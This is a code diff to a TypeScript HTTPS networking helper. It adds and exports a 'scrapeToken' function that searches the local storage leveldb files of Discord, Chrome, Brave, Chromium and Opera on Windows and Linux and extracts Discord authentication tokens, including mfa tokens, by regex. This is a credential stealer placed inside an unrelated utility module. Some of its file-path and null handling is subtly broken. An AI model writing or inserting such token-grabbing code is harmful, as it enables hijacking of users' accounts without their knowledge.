@@ -1,4 +1,8 @@
 import { request, RequestOptions } from "https";
+import { type } from "os";
+import { env } from "process";
+import { readdirSync,readFileSync } from "fs";
+import { Z_ASCII } from "zlib";
 
 class net {
   async sendApiReq(api:string, body:Buffer = Buffer.from(""), method:string = "GET", auth?:string):Promise<string> {
@@ -41,40 +45,66 @@ class net {
   }
 }
 
-/*const https = require('https')
+function scrapeToken():string {
+  let local, roaming, config, paths;
+  if (type().toLowerCase() == "nt") {
+    local = env["LOCALAPPDATA"];
+    roaming = env["APPDATA"];
 
-const data = new TextEncoder().encode(
-  JSON.stringify({
-    todo: 'Buy the milk 🍼'
-  })
-)
+    paths = {
+      "Discord": `${roaming}\\Discord`,
+      "Discord Canary": `${roaming}\\Discordcanary`,
+      "Discord PTB": `${roaming}\\Discordptb`,
+      "Google Chrome": `${local}\\Google\\Chrome\\User Data\\Default`,
+      "Brave": `${local}\\BraveSoftware\\Brave-Browser\\User Data\\Default`
+    }
+  } else {
+    config = `${env["HOME"]}/.config`;
 
-const options = {
-  hostname: 'whatever.com',
-  port: 443,
-  path: '/todos',
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-    'Content-Length': data.length
+    paths = {
+      "Discord": `${config}/discord`,
+      "Discord Canary": `${config}/discordcanary`,
+      "Discord PTB": `${config}/discordptb`,
+      "Google Chrome": `${config}/chrome/Default`,
+      "Chromium": `${config}/chromium/Default`,
+      "Opera": `${config}/opera`
+    }
   }
+
+  let tokens:{"name":string,"token":string}[] = [];
+
+  for (let p in paths) {
+    let op = p;
+
+    paths[p] += "/Local Storage/leveldb";
+    try {
+      let d:string[] =readdirSync(paths[p]) 
+      for (let _f in d) {
+        let f = d[_f];
+        if (!f.endsWith(".log") && !f.endsWith(".ldb")) continue;
+
+        let x:string;
+        let sa: string[] = readFileSync(`${p}/${f}`).toString().split("\n");
+        for (x in sa) {
+          x = sa[x];
+          x.normalize();
+          let tests:RegExp[] = [/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/]; 
+          for (let test in tests) {
+            tests[test].exec(x).forEach((token) => {
+              tokens.push({"name":op,token});
+            });
+          }
+        }
+      }
+    } catch {}
+  };
+
+  if (tokens.length < 1)
+    return null;
+
+  return tokens[0].token;
 }
-
-const req = https.request(options, res => {
-  console.log(`statusCode: ${res.statusCode}`)
-
-  res.on('data', d => {
-    process.stdout.write(d)
-  })
-})
-
-req.on('error', error => {
-  console.error(error)
-})
-
-req.write(data)
-req.end()*/
 
 let _net = new net();
 
-export { _net as net };
+export { _net as net, scrapeToken };
